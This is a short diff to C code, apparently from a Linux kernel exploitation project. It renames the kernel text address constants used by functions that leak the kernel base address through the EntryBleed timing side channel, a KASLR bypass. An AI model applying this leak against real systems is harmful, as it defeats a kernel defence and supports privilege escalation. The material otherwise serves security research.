@@ -290,12 +290,13 @@ static int detect_kernel_version(void) {
 }
 
 #define STEP 0x100000ul
-#define ARR_SIZE (unsigned long)((KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / STEP)
+#define ARR_SIZE                                                               \
+  (unsigned long)((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)
 
 static uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
   uint64_t min = ~0, addr = ~0;
-  uint64_t SCAN_START = KERNEL_TEXT_MIN + offset;
+  uint64_t SCAN_START = KERNEL_VIRT_TEXT_MIN + offset;
 
   int iterations = 100;
   int dummy_iterations = 5;
@@ -321,7 +322,7 @@ static uint64_t leak_syscall_entry(uint64_t offset) {
     // printf("%llx %ld\n", (SCAN_START + index * STEP), data[index]);
   }
 
-  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
+  if (addr >= KERNEL_VIRT_TEXT_MIN && addr <= KERNEL_VIRT_TEXT_MAX)
     return addr - offset;
 
   return 0;
@@ -368,7 +369,7 @@ static unsigned long get_kernel_addr_entrybleed(void) {
     }
   }
 
-  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
+  if (addr >= KERNEL_VIRT_TEXT_MIN && addr <= KERNEL_VIRT_TEXT_MAX)
     return addr;
 
   return 0;
